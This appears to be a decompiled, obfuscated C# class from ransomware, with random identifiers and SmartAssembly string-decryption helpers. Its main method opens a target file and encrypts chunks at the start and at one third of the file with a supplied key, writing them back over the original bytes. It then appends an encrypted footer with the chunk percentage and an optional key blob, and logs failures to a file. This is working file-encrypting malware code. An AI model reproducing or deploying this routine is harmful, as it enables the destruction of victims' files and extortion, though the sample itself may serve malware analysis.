using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using wFdpgJCgVUnL;

namespace YBTDaqZXTw;

internal sealed class JyNvffrllaXO
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int qEdwDYQYcS(long long_0)
	{
		return (int)long_0;
	}

	public static void cwEdRCAtuf(string huXvINaYkaVOo, string oMwBAbpOKgRUS, string YLHrogOCIw, byte[] fKXiIazEiLWgqdRV = null)
	{
		try
		{
			using FileStream fileStream = new FileStream(huXvINaYkaVOo, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			int num = qEdwDYQYcS(fileStream.Length) / 3;
			if (num < 0)
			{
				num *= -1;
			}
			int num2 = 0;
			try
			{
				num2 = Convert.ToInt32(oMwBAbpOKgRUS) * Convert.ToInt32(fileStream.Length) / 100;
				if (num2 < 0)
				{
					num2 *= -1;
				}
			}
			catch
			{
				num2 = int.MaxValue;
			}
			if (num < num2)
			{
				num2 = num - Convert.ToInt32(oMwBAbpOKgRUS) * 1000 * 1000;
			}
			int cQmiBLdTUys = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
			byte[] array = null;
			for (int i = 0; i < 2; i++)
			{
				byte[] byte_ = mXvKIFWNJyOJ(huXvINaYkaVOo, fileStream, cQmiBLdTUys, num * i);
				array = (fdvkylEGapkbT.KzojBHDhTMmk ? YeMtRiUfWWXgoc.zyKaParKlJQ(byte_, Encoding.ASCII.GetBytes(YLHrogOCIw), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : mYdJdJnIkYOjBSNk.zCsTXlHwmxYOHTJB(byte_, Encoding.ASCII.GetBytes(YLHrogOCIw), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
				DXDhtumnNwQxFE(huXvINaYkaVOo, fileStream, array, num * i);
			}
		}
		catch (Exception ex)
		{
			if (fdvkylEGapkbT.TfpcYTfYwiZ)
			{
				try
				{
					File.AppendAllText(fdvkylEGapkbT.XTpFtiqHigTwzn, getString_0(107390492) + huXvINaYkaVOo + getString_0(107403614) + ex.Message + getString_0(107396639));
				}
				catch (Exception)
				{
				}
			}
		}
		byte[] array2 = null;
		array2 = (fdvkylEGapkbT.dKfSpybLYvFvyKv ? Encoding.ASCII.GetBytes(fdvkylEGapkbT.UMsFeqgmECpmMQw(getString_0(107403561)) + fdvkylEGapkbT.UMsFeqgmECpmMQw(getString_0(107404630)) + Convert.ToString(oMwBAbpOKgRUS) + fdvkylEGapkbT.UMsFeqgmECpmMQw(getString_0(107404630))) : Encoding.ASCII.GetBytes(fdvkylEGapkbT.UMsFeqgmECpmMQw(getString_0(107403561)) + fdvkylEGapkbT.UMsFeqgmECpmMQw(getString_0(107404607)) + Convert.ToString(oMwBAbpOKgRUS) + fdvkylEGapkbT.UMsFeqgmECpmMQw(getString_0(107404607))));
		if (!fdvkylEGapkbT.dKfSpybLYvFvyKv)
		{
			using (FileStream fileStream2 = new FileStream(huXvINaYkaVOo, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
			{
				fileStream2.Write(array2, 0, array2.Length);
				return;
			}
		}
		using FileStream fileStream3 = new FileStream(huXvINaYkaVOo, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
		fileStream3.Write(fKXiIazEiLWgqdRV, 0, fKXiIazEiLWgqdRV.Length);
		fileStream3.Write(array2, 0, array2.Length);
	}

	public static byte[] mXvKIFWNJyOJ(string tmUqOGYeuaarDzmDO, FileStream cffgKjPHRWlrKlq, int CQmiBLdTUys, int NgaxLdAcPOqUy = 0)
	{
		byte[] array = new byte[CQmiBLdTUys];
		cffgKjPHRWlrKlq.Position = NgaxLdAcPOqUy;
		cffgKjPHRWlrKlq.Read(array, 0, CQmiBLdTUys);
		return array;
	}

	public static void DXDhtumnNwQxFE(string VUklZYItnwmK, FileStream USIdeFqXemnZL, byte[] QMURimjhaeq, int vkCOUGnKNbnZ = 0)
	{
		USIdeFqXemnZL.Position = vkCOUGnKNbnZ;
		USIdeFqXemnZL.Write(QMURimjhaeq, 0, QMURimjhaeq.Length);
	}

	static JyNvffrllaXO()
	{
		Strings.CreateGetStringDelegate(typeof(JyNvffrllaXO));
	}
}
